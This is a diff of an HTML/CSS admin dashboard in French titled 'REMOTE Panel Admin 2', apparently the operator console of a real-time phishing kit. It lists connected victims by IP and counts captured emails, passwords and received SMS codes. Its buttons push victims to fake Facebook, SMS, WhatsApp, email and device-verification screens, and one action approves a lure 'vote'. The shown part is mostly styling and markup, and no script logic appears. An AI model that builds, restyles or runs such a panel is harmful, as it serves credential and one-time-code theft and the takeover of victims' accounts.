@@ -3,491 +3,229 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REMOTE Panel 2 - Admin</title>
+    <title>REMOTE - Panel Admin 2</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #12121a;
-            --bg-card: #1a1a2e;
-            --bg-card-hover: #1f1f35;
-            --bg-input: #16162a;
-            --border: #2a2a45;
-            --border-active: #6366f1;
-            --text-primary: #e8e8f0;
-            --text-secondary: #8888aa;
-            --text-muted: #555577;
-            --accent: #6366f1;
-            --accent-hover: #818cf8;
-            --accent-glow: rgba(99, 102, 241, 0.3);
-            --success: #22c55e;
-            --success-bg: rgba(34, 197, 94, 0.1);
-            --warning: #f59e0b;
-            --warning-bg: rgba(245, 158, 11, 0.1);
-            --danger: #ef4444;
-            --danger-bg: rgba(239, 68, 68, 0.1);
-            --info: #3b82f6;
-            --info-bg: rgba(59, 130, 246, 0.1);
-            --purple: #a855f7;
-            --purple-bg: rgba(168, 85, 247, 0.1);
-            --pink: #ec4899;
-            --pink-bg: rgba(236, 72, 153, 0.1);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
-        body { background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; overflow-x: hidden; }
-        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 20% 0%, rgba(168, 85, 247, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 80% 100%, rgba(99, 102, 241, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
-
-        .app { position: relative; z-index: 1; }
-
-        /* Header */
-        .header { background: rgba(18, 18, 26, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); padding: 16px 24px; position: sticky; top: 0; z-index: 100; }
-        .header-inner { max-width: 1400px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
-        .logo { display: flex; align-items: center; gap: 12px; }
-        .logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, var(--purple), var(--accent)); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #fff; }
-        .logo-text { font-size: 20px; font-weight: 700; color: var(--text-primary); }
-        .logo-text span { color: var(--purple); }
-        .header-actions { display: flex; align-items: center; gap: 12px; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .header-badge { display: flex; align-items: center; gap: 8px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 6px 12px; font-size: 13px; color: var(--text-secondary); }
-        .header-badge .val { color: var(--text-primary); font-weight: 600; }
-
-        /* Stats Bar */
-        .stats-bar { max-width: 1400px; margin: 20px auto; padding: 0 24px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }
-        .stat-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px 20px; display: flex; align-items: center; gap: 14px; transition: all .2s; }
-        .stat-card:hover { border-color: var(--purple); transform: translateY(-1px); }
-        .stat-icon { width: 44px; height: 44px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
-        .stat-icon.blue { background: var(--info-bg); color: var(--info); }
-        .stat-icon.green { background: var(--success-bg); color: var(--success); }
-        .stat-icon.yellow { background: var(--warning-bg); color: var(--warning); }
-        .stat-icon.purple { background: var(--purple-bg); color: var(--purple); }
-        .stat-info { flex: 1; }
-        .stat-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }
-        .stat-value { font-size: 22px; font-weight: 700; color: var(--text-primary); }
-
-        /* Main Layout */
-        .main { max-width: 1400px; margin: 0 auto; padding: 0 24px 40px; display: grid; grid-template-columns: 340px 1fr; gap: 20px; }
-        @media (max-width: 900px) { .main { grid-template-columns: 1fr; } }
-
-        /* Sidebar - Client List */
-        .sidebar { display: flex; flex-direction: column; gap: 12px; }
-        .panel { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
-        .panel-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
-        .panel-title { font-size: 14px; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
-        .panel-title i { color: var(--purple); font-size: 14px; }
-        .panel-badge { background: var(--purple); color: #fff; font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 10px; }
-        .panel-body { padding: 12px; max-height: 500px; overflow-y: auto; }
-        .panel-body::-webkit-scrollbar { width: 4px; }
-        .panel-body::-webkit-scrollbar-track { background: transparent; }
-        .panel-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
-
-        .client-item { display: flex; align-items: center; gap: 12px; padding: 12px; border-radius: 8px; cursor: pointer; transition: all .15s; border: 1px solid transparent; margin-bottom: 4px; }
-        .client-item:hover { background: var(--bg-card-hover); border-color: var(--border); }
-        .client-item.active { background: rgba(168, 85, 247, 0.1); border-color: var(--purple); }
-        .client-avatar { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 700; color: #fff; flex-shrink: 0; }
-        .client-avatar.online { background: linear-gradient(135deg, var(--success), #16a34a); }
-        .client-avatar.offline { background: linear-gradient(135deg, #555, #333); }
-        .client-info { flex: 1; min-width: 0; }
-        .client-ip { font-size: 13px; font-weight: 600; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .client-page { font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 4px; margin-top: 2px; }
-        .client-page .dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
-        .client-time { font-size: 11px; color: var(--text-muted); flex-shrink: 0; }
-        .no-clients { text-align: center; padding: 40px 20px; color: var(--text-muted); }
-        .no-clients i { font-size: 36px; margin-bottom: 12px; display: block; opacity: 0.3; }
-        .no-clients p { font-size: 13px; }
-
-        /* Content Area */
-        .content { display: flex; flex-direction: column; gap: 16px; }
-        .content-placeholder { text-align: center; padding: 80px 40px; color: var(--text-muted); }
-        .content-placeholder i { font-size: 48px; margin-bottom: 16px; display: block; opacity: 0.2; }
-        .content-placeholder p { font-size: 14px; }
-
-        /* Client Header Card */
-        .client-header { display: flex; align-items: center; gap: 16px; padding: 20px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; }
-        .client-header .avatar { width: 56px; height: 56px; border-radius: 14px; background: linear-gradient(135deg, var(--purple), var(--accent)); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; }
-        .client-header .info { flex: 1; }
-        .client-header .name { font-size: 18px; font-weight: 700; color: var(--text-primary); }
-        .client-header .meta { font-size: 13px; color: var(--text-secondary); margin-top: 2px; }
-        .page-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 600; color: #fff; }
-
-        /* Data Grid */
-        .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 12px; }
-        .data-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; position: relative; transition: all .2s; }
-        .data-card:hover { border-color: var(--border-active); }
-        .data-card .label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; display: flex; align-items: center; gap: 6px; }
-        .data-card .label i { font-size: 12px; }
-        .data-card .value { font-size: 15px; font-weight: 600; color: var(--text-primary); word-break: break-all; font-family: 'SF Mono', 'Fira Code', monospace; }
-        .data-card .value.empty { color: var(--text-muted); font-style: italic; font-weight: 400; }
-        .copy-btn { position: absolute; top: 12px; right: 12px; background: var(--bg-input); border: 1px solid var(--border); border-radius: 6px; padding: 6px 8px; color: var(--text-secondary); cursor: pointer; font-size: 12px; transition: all .15s; }
-        .copy-btn:hover { background: var(--purple); color: #fff; border-color: var(--purple); }
-
-        /* Actions Grid */
-        .actions-section { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
-        .actions-section .section-header { padding: 16px 20px; border-bottom: 1px solid var(--border); }
-        .actions-section .section-title { font-size: 14px; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
-        .actions-section .section-title i { color: var(--purple); }
-        .actions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 10px; padding: 16px; }
-        .action-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 16px; border: 1px solid var(--border); border-radius: 10px; font-size: 13px; font-weight: 500; cursor: pointer; color: var(--text-primary); background: var(--bg-input); transition: all .2s; font-family: inherit; }
-        .action-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-        .action-btn:active { transform: translateY(0); }
-        .action-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-        .action-btn i { font-size: 14px; }
-        .action-btn.facebook { border-color: #1877f2; color: #1877f2; }
-        .action-btn.facebook:hover { background: #1877f2; color: #fff; }
-        .action-btn.error { border-color: var(--danger); color: var(--danger); }
-        .action-btn.error:hover { background: var(--danger); color: #fff; }
-        .action-btn.success { border-color: var(--success); color: var(--success); }
-        .action-btn.success:hover { background: var(--success); color: #fff; }
-        .action-btn.sms { border-color: #34a853; color: #34a853; }
-        .action-btn.sms:hover { background: #34a853; color: #fff; }
-        .action-btn.whatsapp { border-color: #25d366; color: #25d366; }
-        .action-btn.whatsapp:hover { background: #25d366; color: #fff; }
-        .action-btn.email { border-color: #ea4335; color: #ea4335; }
-        .action-btn.email:hover { background: #ea4335; color: #fff; }
-        .action-btn.device { border-color: var(--purple); color: var(--purple); }
-        .action-btn.device:hover { background: var(--purple); color: #fff; }
-        .action-btn.loading { border-color: var(--warning); color: var(--warning); }
-        .action-btn.loading:hover { background: var(--warning); color: #fff; }
-        .action-btn.retry { border-color: var(--text-secondary); color: var(--text-secondary); }
-        .action-btn.retry:hover { background: var(--text-secondary); color: #fff; }
-
-        /* Toast */
-        .toast { position: fixed; bottom: 24px; right: 24px; padding: 12px 20px; border-radius: 10px; color: #fff; font-size: 13px; font-weight: 500; opacity: 0; transition: all .3s; z-index: 1000; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0b0f1a; color: #e2e8f0; min-height: 100vh; display: flex; overflow-x: hidden; }
+        .sidebar { width: 280px; background: linear-gradient(180deg, #0f1629 0%, #0a0e1a 100%); border-right: 1px solid rgba(255,255,255,0.04); min-height: 100vh; position: fixed; top: 0; left: 0; display: flex; flex-direction: column; z-index: 100; }
+        .sb-head { padding: 28px 24px 20px; border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .sb-logo { display: flex; align-items: center; gap: 12px; }
+        .sb-logo-icon { width: 42px; height: 42px; background: linear-gradient(135deg, #f43f5e, #e11d48); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #fff; box-shadow: 0 4px 20px rgba(244,63,94,0.3); }
+        .sb-logo-text { font-size: 1.15rem; font-weight: 800; letter-spacing: -0.02em; }
+        .sb-logo-text span { color: #fb7185; }
+        .sb-subtitle { font-size: 0.72rem; color: #475569; margin-top: 4px; }
+        .sb-menu { padding: 20px 14px; flex: 1; }
+        .sb-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.12em; color: #334155; font-weight: 700; padding: 0 14px; margin-bottom: 8px; margin-top: 16px; }
+        .sb-label:first-child { margin-top: 0; }
+        .sb-item { display: flex; align-items: center; gap: 12px; padding: 11px 14px; border-radius: 10px; font-size: 0.85rem; font-weight: 500; color: #64748b; cursor: pointer; transition: all .2s; margin-bottom: 2px; position: relative; }
+        .sb-item:hover { background: rgba(255,255,255,0.03); color: #94a3b8; }
+        .sb-item.active { background: rgba(244,63,94,0.12); color: #fda4af; }
+        .sb-item.active::before { content:''; position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 3px; height: 20px; background: #f43f5e; border-radius: 0 3px 3px 0; }
+        .sb-item i { width: 20px; font-size: 15px; text-align: center; }
+        .sb-badge { margin-left: auto; background: #f43f5e; color: #fff; font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: 8px; }
+        .sb-foot { padding: 18px 24px; border-top: 1px solid rgba(255,255,255,0.04); }
+        .sb-status { display: flex; align-items: center; gap: 10px; }
+        .sb-dot { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; box-shadow: 0 0 12px rgba(34,197,94,0.4); animation: glow 2s ease-in-out infinite; }
+        @keyframes glow { 0%,100%{opacity:1}50%{opacity:.4} }
+        .sb-status-text { font-size: 0.78rem; color: #475569; }
+        .main { margin-left: 280px; flex: 1; min-height: 100vh; }
+        .topbar { background: rgba(15,22,41,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.04); padding: 0 36px; height: 68px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 50; }
+        .tb-left { display: flex; align-items: center; gap: 16px; }
+        .tb-title { font-size: 1.15rem; font-weight: 700; }
+        .tb-right { display: flex; align-items: center; gap: 14px; }
+        .tb-pill { display: flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 10px; padding: 7px 14px; font-size: 0.78rem; color: #64748b; }
+        .tb-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; }
+        .tb-switch { display: flex; align-items: center; gap: 8px; }
+        .tb-switch span { font-size: 0.75rem; color: #475569; }
+        .sw { position: relative; width: 36px; height: 20px; }
+        .sw input { opacity: 0; width: 0; height: 0; }
+        .sw .tr { position: absolute; inset: 0; background: #1e293b; border: 1px solid #334155; border-radius: 20px; cursor: pointer; transition: .3s; }
+        .sw .tr::before { content:''; position: absolute; width: 14px; height: 14px; left: 2px; bottom: 2px; background: #475569; border-radius: 50%; transition: .3s; }
+        .sw input:checked + .tr { background: #f43f5e; border-color: #f43f5e; }
+        .sw input:checked + .tr::before { transform: translateX(16px); background: #fff; }
+        .btn-act { background: #f43f5e; color: #fff; border: none; padding: 9px 18px; border-radius: 10px; cursor: pointer; font-size: 0.78rem; font-weight: 600; display: flex; align-items: center; gap: 6px; font-family: inherit; transition: .2s; }
+        .btn-act:hover { background: #fb7185; box-shadow: 0 4px 16px rgba(244,63,94,0.3); }
+        .content { padding: 32px 36px; }
+        .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; margin-bottom: 32px; }
+        .st { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; padding: 22px; transition: .2s; }
+        .st:hover { border-color: rgba(255,255,255,0.08); transform: translateY(-2px); }
+        .st-top { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+        .st-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 17px; }
+        .st-icon.i1 { background: rgba(244,63,94,0.12); color: #fb7185; }
+        .st-icon.i2 { background: rgba(34,197,94,0.12); color: #4ade80; }
+        .st-icon.i3 { background: rgba(251,191,36,0.12); color: #fbbf24; }
+        .st-icon.i4 { background: rgba(168,85,247,0.12); color: #c084fc; }
+        .st-num { font-size: 1.8rem; font-weight: 800; letter-spacing: -0.03em; }
+        .st-lbl { font-size: 0.72rem; color: #475569; text-transform: uppercase; letter-spacing: 0.06em; font-weight: 600; }
+        .dash { display: grid; grid-template-columns: 340px 1fr; gap: 20px; }
+        @media(max-width:1024px){.sidebar{transform:translateX(-100%)}.sidebar.open{transform:translateX(0)}.main{margin-left:0}.stats{grid-template-columns:1fr 1fr}.dash{grid-template-columns:1fr}}
+        .cl-panel { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; overflow: hidden; }
+        .cl-head { padding: 20px 22px; border-bottom: 1px solid rgba(255,255,255,0.04); display: flex; align-items: center; justify-content: space-between; }
+        .cl-title { font-size: 0.88rem; font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        .cl-title i { color: #f43f5e; font-size: 14px; }
+        .cl-cnt { background: #f43f5e; color: #fff; font-size: 0.68rem; font-weight: 700; padding: 3px 10px; border-radius: 10px; }
+        .cl-body { max-height: 520px; overflow-y: auto; padding: 8px; }
+        .cl-body::-webkit-scrollbar{width:3px}
+        .cl-body::-webkit-scrollbar-track{background:transparent}
+        .cl-body::-webkit-scrollbar-thumb{background:#1e293b;border-radius:3px}
+        .cl-item { display: flex; align-items: center; gap: 12px; padding: 13px 14px; border-radius: 10px; cursor: pointer; transition: all .15s; border: 1px solid transparent; margin-bottom: 3px; }
+        .cl-item:hover { background: rgba(255,255,255,0.02); border-color: rgba(255,255,255,0.04); }
+        .cl-item.active { background: rgba(244,63,94,0.1); border-color: rgba(244,63,94,0.3); }
+        .cl-ava { width: 40px; height: 40px; border-radius: 10px; background: linear-gradient(135deg, #22c55e, #16a34a); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: #fff; flex-shrink: 0; }
+        .cl-ava.off { background: linear-gradient(135deg, #475569, #334155); }
+        .cl-info { flex: 1; min-width: 0; }
+        .cl-ip { font-size: 0.82rem; font-weight: 600; }
+        .cl-pg { font-size: 0.72rem; color: #475569; display: flex; align-items: center; gap: 5px; margin-top: 3px; }
+        .cl-pg-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+        .cl-time { font-size: 0.7rem; color: #334155; flex-shrink: 0; }
+        .cl-empty { text-align: center; padding: 52px 20px; color: #334155; }
+        .cl-empty i { font-size: 32px; margin-bottom: 14px; display: block; opacity: .2; }
+        .cl-empty p { font-size: 0.82rem; }
+        .cr { display: flex; flex-direction: column; gap: 16px; }
+        .cr-ph { text-align: center; padding: 120px 40px; color: #334155; }
+        .cr-ph i { font-size: 48px; margin-bottom: 18px; display: block; opacity: .12; }
+        .cr-ph p { font-size: 0.88rem; }
+        .cd-top { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; padding: 24px; display: flex; align-items: center; gap: 18px; }
+        .cd-ava { width: 56px; height: 56px; border-radius: 14px; background: linear-gradient(135deg, #f43f5e, #e11d48); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; box-shadow: 0 4px 20px rgba(244,63,94,0.25); }
+        .cd-info { flex: 1; }
+        .cd-name { font-size: 1.1rem; font-weight: 700; }
+        .cd-sub { font-size: 0.75rem; color: #475569; margin-top: 4px; font-family: monospace; }
+        .cd-badge { padding: 8px 16px; border-radius: 10px; font-size: 0.72rem; font-weight: 600; color: #fff; }
+        .dg { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px,1fr)); gap: 12px; }
+        .dc { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 14px; padding: 18px; position: relative; transition: .2s; }
+        .dc:hover { border-color: rgba(255,255,255,0.08); }
+        .dc-lbl { font-size: 0.68rem; color: #475569; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; gap: 7px; }
+        .dc-lbl i { font-size: 12px; }
+        .dc-val { font-size: 0.92rem; font-weight: 600; word-break: break-all; font-family: 'SF Mono','Fira Code',monospace; line-height: 1.5; }
+        .dc-val.empty { color: #334155; font-style: italic; font-weight: 400; }
+        .dc-copy { position: absolute; top: 14px; right: 14px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 6px; padding: 6px 8px; color: #475569; cursor: pointer; font-size: 11px; transition: .15s; }
+        .dc-copy:hover { background: #f43f5e; color: #fff; border-color: #f43f5e; }
+        .act-panel { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04); border-radius: 16px; overflow: hidden; }
+        .act-hd { padding: 20px 22px; border-bottom: 1px solid rgba(255,255,255,0.04); display: flex; align-items: center; gap: 8px; font-size: 0.88rem; font-weight: 700; }
+        .act-hd i { color: #f43f5e; }
+        .act-g { display: grid; grid-template-columns: repeat(auto-fill, minmax(165px,1fr)); gap: 10px; padding: 18px; }
+        .ab { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 13px 14px; border: 1.5px solid rgba(255,255,255,0.06); border-radius: 10px; font-size: 0.78rem; font-weight: 600; cursor: pointer; color: #94a3b8; background: rgba(255,255,255,0.01); transition: all .2s; font-family: inherit; }
+        .ab:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(0,0,0,0.3); }
+        .ab:active { transform: translateY(0); }
+        .ab:disabled { opacity: .3; cursor: not-allowed; transform: none; }
+        .ab i { font-size: 13px; }
+        .ab.facebook{border-color:rgba(24,119,242,.3);color:#60a5fa}.ab.facebook:hover{background:#1877f2;color:#fff;border-color:#1877f2}
+        .ab.error{border-color:rgba(239,68,68,.3);color:#f87171}.ab.error:hover{background:#ef4444;color:#fff;border-color:#ef4444}
+        .ab.success{border-color:rgba(34,197,94,.3);color:#4ade80}.ab.success:hover{background:#22c55e;color:#fff;border-color:#22c55e}
+        .ab.sms{border-color:rgba(34,197,94,.3);color:#4ade80}.ab.sms:hover{background:#16a34a;color:#fff;border-color:#16a34a}
+        .ab.whatsapp{border-color:rgba(37,211,102,.3);color:#4ade80}.ab.whatsapp:hover{background:#16a34a;color:#fff;border-color:#16a34a}
+        .ab.email{border-color:rgba(239,68,68,.3);color:#f87171}.ab.email:hover{background:#ef4444;color:#fff;border-color:#ef4444}
+        .ab.device{border-color:rgba(168,85,247,.3);color:#c084fc}.ab.device:hover{background:#a855f7;color:#fff;border-color:#a855f7}
+        .ab.loading{border-color:rgba(251,191,36,.3);color:#fbbf24}.ab.loading:hover{background:#f59e0b;color:#fff;border-color:#f59e0b}
+        .ab.retry{border-color:rgba(148,163,184,.2);color:#64748b}.ab.retry:hover{background:#475569;color:#fff;border-color:#475569}
+        .notif-item{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;border-radius:10px;transition:background .15s;cursor:default;margin-bottom:2px}
+        .notif-item:hover{background:rgba(255,255,255,0.03)}.notif-item.new{background:rgba(244,63,94,0.08)}
+        .notif-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0;margin-top:2px}
+        .notif-icon.connect{background:rgba(34,197,94,0.15);color:#4ade80}
+        .notif-icon.data{background:rgba(251,191,36,0.15);color:#fbbf24}
+        .notif-icon.action{background:rgba(244,63,94,0.15);color:#fb7185}
+        .notif-icon.page{background:rgba(168,85,247,0.15);color:#c084fc}
+        .notif-body{flex:1;min-width:0}
+        .notif-title{font-size:0.78rem;font-weight:600;color:#e2e8f0}
+        .notif-msg{font-size:0.7rem;color:#64748b;margin-top:2px;word-break:break-all}
+        .notif-time{font-size:0.62rem;color:#334155;margin-top:3px}
+        .toast { position: fixed; bottom: 28px; right: 28px; padding: 14px 22px; border-radius: 12px; color: #fff; font-size: 0.82rem; font-weight: 600; opacity: 0; transition: all .3s cubic-bezier(.22,1,.36,1); z-index: 1000; box-shadow: 0 8px 32px rgba(0,0,0,.4); transform: translateY(10px); }
         .toast.show { opacity: 1; transform: translateY(0); }
-        .toast.success { background: rgba(34, 197, 94, 0.9); }
-        .toast.error { background: rgba(239, 68, 68, 0.9); }
-
-        /* Toggle */
-        .toggle-wrap { display: flex; align-items: center; gap: 8px; }
-        .toggle-wrap label { font-size: 12px; color: var(--text-secondary); }
-        .toggle { position: relative; width: 40px; height: 22px; }
-        .toggle input { opacity: 0; width: 0; height: 0; }
-        .toggle .slider { position: absolute; inset: 0; background: var(--border); border-radius: 22px; cursor: pointer; transition: .3s; }
-        .toggle .slider::before { content: ''; position: absolute; width: 16px; height: 16px; left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: .3s; }
-        .toggle input:checked + .slider { background: var(--purple); }
-        .toggle input:checked + .slider::before { transform: translateX(18px); }
-
-        .refresh-btn { background: var(--purple); color: #fff; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 6px; font-family: inherit; transition: all .2s; }
-        .refresh-btn:hover { background: var(--accent-hover); }
-
-        @media (max-width: 768px) {
-            .stats-bar { grid-template-columns: 1fr 1fr; }
-            .actions-grid { grid-template-columns: 1fr 1fr; }
-            .data-grid { grid-template-columns: 1fr; }
-        }
+        .toast.success { background: rgba(34,197,94,.92); }
+        .toast.error { background: rgba(239,68,68,.92); }
     </style>
 </head>
 <body>
-    <div class="app">
-        <div class="header">
-            <div class="header-inner">
-                <div class="logo">
-                    <div class="logo-icon"><i class="fas fa-satellite-dish"></i></div>
-                    <div class="logo-text">REMOTE<span>panel2</span></div>
-                </div>
-                <div class="header-actions">
-                    <div class="header-badge">
-                        <div class="status-dot"></div>
-                        <span>En ligne</span>
-                    </div>
-                    <div class="toggle-wrap">
-                        <label>Auto</label>
-                        <label class="toggle">
-                            <input type="checkbox" id="auto-refresh-toggle" checked onchange="toggleAutoRefresh()">
-                            <span class="slider"></span>
-                        </label>
-                    </div>
-                    <button class="refresh-btn" onclick="loadClients()"><i class="fas fa-sync-alt"></i> Actualiser</button>
+    <aside class="sidebar" id="sidebar">
+        <div class="sb-head">
+            <div class="sb-logo">
+                <div class="sb-logo-icon"><i class="fas fa-satellite-dish"></i></div>
+                <div>
+                    <div class="sb-logo-text">REMOTE<span>panel</span></div>
+                    <div class="sb-subtitle">Panel Admin 2</div>
                 </div>
             </div>
         </div>
-
-        <div class="stats-bar">
-            <div class="stat-card">
-                <div class="stat-icon blue"><i class="fas fa-users"></i></div>
-                <div class="stat-info">
-                    <div class="stat-label">Clients</div>
-                    <div class="stat-value" id="stat-clients">0</div>
-                </div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon green"><i class="fas fa-envelope"></i></div>
-                <div class="stat-info">
-                    <div class="stat-label">Emails</div>
-                    <div class="stat-value" id="stat-emails">0</div>
-                </div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon yellow"><i class="fas fa-key"></i></div>
-                <div class="stat-info">
-                    <div class="stat-label">Mots de passe</div>
-                    <div class="stat-value" id="stat-passwords">0</div>
-                </div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-icon purple"><i class="fas fa-sms"></i></div>
-                <div class="stat-info">
-                    <div class="stat-label">Codes recus</div>
-                    <div class="stat-value" id="stat-codes">0</div>
-                </div>
-            </div>
+        <div class="sb-menu">
+            <div class="sb-label">Menu principal</div>
+            <div class="sb-item active" onclick="showSection(this)"><i class="fas fa-th-large"></i> Dashboard</div>
+            <div class="sb-item" onclick="showSection(this)"><i class="fas fa-users"></i> Clients <span class="sb-badge" id="sb-count">0</span></div>
+            <div class="sb-item" onclick="showSection(this)"><i class="fas fa-database"></i> Donnees</div>
+            <div class="sb-label">Actions rapides</div>
+            <div class="sb-item" onclick="quickAction('vote_approved')"><i class="fas fa-check-circle"></i> Approuver vote</div>
+            <div class="sb-item" onclick="quickAction('loading')"><i class="fas fa-spinner"></i> Envoyer loading</div>
+            <div class="sb-item" onclick="quickAction('technical_error')"><i class="fas fa-exclamation-triangle"></i> Envoyer erreur</div>
+            <div class="sb-item" onclick="quickAction('retry')"><i class="fas fa-redo"></i> Reessayer</div>
+            <div class="sb-label">Parametres</div>
+            <div class="sb-item"><i class="fas fa-bell"></i> Notifications</div>
+            <div class="sb-item"><i class="fas fa-shield-alt"></i> Securite</div>
         </div>
+        <div class="sb-foot">
+            <div class="sb-status"><div class="sb-dot"></div><span class="sb-status-text">Systeme operationnel</span></div>
+        </div>
+    </aside>
 
-        <div class="main">
-            <div class="sidebar">
-                <div class="panel">
-                    <div class="panel-header">
-                        <div class="panel-title"><i class="fas fa-list"></i> Clients connectes</div>
-                        <div class="panel-badge" id="client-count">0</div>
-                    </div>
-                    <div class="panel-body" id="clients-container">
-                        <div class="no-clients">
-                            <i class="fas fa-user-slash"></i>
-                            <p>Aucun client pour le moment</p>
-                        </div>
+    <main class="main">
+        <div class="topbar">
+            <div class="tb-left"><div class="tb-title">Dashboard</div></div>
+            <div class="tb-right">
+                <div class="tb-pill"><div class="dot"></div> En ligne</div>
+                <div class="tb-switch"><span>Auto</span><label class="sw"><input type="checkbox" id="auto-refresh-toggle" checked onchange="toggleAutoRefresh()"><span class="tr"></span></label></div>
+                <button class="btn-act" onclick="loadClients()"><i class="fas fa-sync-alt"></i> Actualiser</button>
+                <div style="position:relative">
+                    <button class="btn-act" onclick="toggleNotifPanel()" style="position:relative"><i class="fas fa-bell"></i><span id="notif-badge" style="position:absolute;top:-4px;right:-4px;background:#ef4444;color:#fff;font-size:0.6rem;font-weight:700;min-width:16px;height:16px;border-radius:8px;display:none;align-items:center;justify-content:center;padding:0 4px">0</span></button>
+                    <div id="notif-dropdown" style="display:none;position:absolute;top:calc(100% + 8px);right:0;width:360px;max-height:420px;overflow-y:auto;background:#1e293b;border:1px solid rgba(255,255,255,0.08);border-radius:14px;box-shadow:0 12px 40px rgba(0,0,0,0.5);z-index:200">
